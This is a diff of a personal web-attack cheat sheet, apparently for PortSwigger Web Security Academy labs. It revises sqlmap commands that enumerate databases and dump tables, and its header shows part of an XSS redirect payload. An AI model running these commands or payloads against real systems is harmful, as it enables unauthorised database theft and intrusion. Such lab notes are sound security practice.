@@ -19,10 +19,10 @@ location ='https://url.web-security-academy.net/?SearchTerm=%22-%28window%5B%22d
 ```
 
 # SQLi
-sqlmap -r request --level=5 --risk=3 --batch -p "parameter" -dump <-- takes too long
-sqlmap -u "url-here" --cookie="cookies-here" --level=5 --risk=3 --batch -p "parameter" --dump <-- takes too long
-sqlmap -u "url-here" --cookie="cookies-here" --batch --dbs --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/"
-sqlmap -u "url-here" --cookie="cookies-here" --batch --dbs --random-agent -p "parameter"
+sqlmap -u "url" --cookie="cookies" --batch --dbs --random-agent -p "parameter"
+sqlmap -u "url" --cookie="cookies" --batch --dbs --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/" --level=3
+sqlmap -u "url" --cookie="cookies" --batch -D database -T table --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/" --level=3 --dump
+
 
 # Insecure Deserialization
 - Command
